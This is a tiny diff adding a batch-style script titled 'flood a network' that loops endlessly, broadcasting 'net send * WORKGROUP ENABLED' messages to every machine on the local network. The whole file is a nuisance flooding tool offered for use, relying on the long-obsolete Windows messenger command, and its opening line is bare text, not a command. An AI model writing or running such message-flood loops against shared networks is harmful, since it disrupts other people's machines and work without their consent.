@@ -1,0 +1,8 @@
+flood a network
+
+:x
+
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+
+goto x
